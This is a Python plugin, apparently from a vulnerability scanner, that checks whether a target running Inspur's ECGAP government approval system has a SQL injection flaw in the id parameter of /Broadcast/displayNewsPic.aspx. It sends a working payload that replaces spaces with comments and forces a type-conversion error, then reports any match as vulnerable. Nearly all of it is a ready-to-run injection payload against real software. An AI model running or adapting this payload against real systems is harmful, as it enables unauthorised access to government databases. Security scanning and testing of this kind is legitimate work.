#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 浪潮ECGAP政务审批系统SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-075562
author: Lucifer
description: 浪潮政务审批平台ECGAP /Broadcast/displayNewsPic.aspx文件中,参数id存在注入,过滤了空格,利用/**/绕过，同时过滤了@@version。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/Broadcast/displayNewsPic.aspx?id=00187/**/and/**/1=CoNvErT(InT,ChAr(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73))"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url,  headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('gaoji')!=-1:
            Medusa = "{} 存在浪潮ECGAP政务审批系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass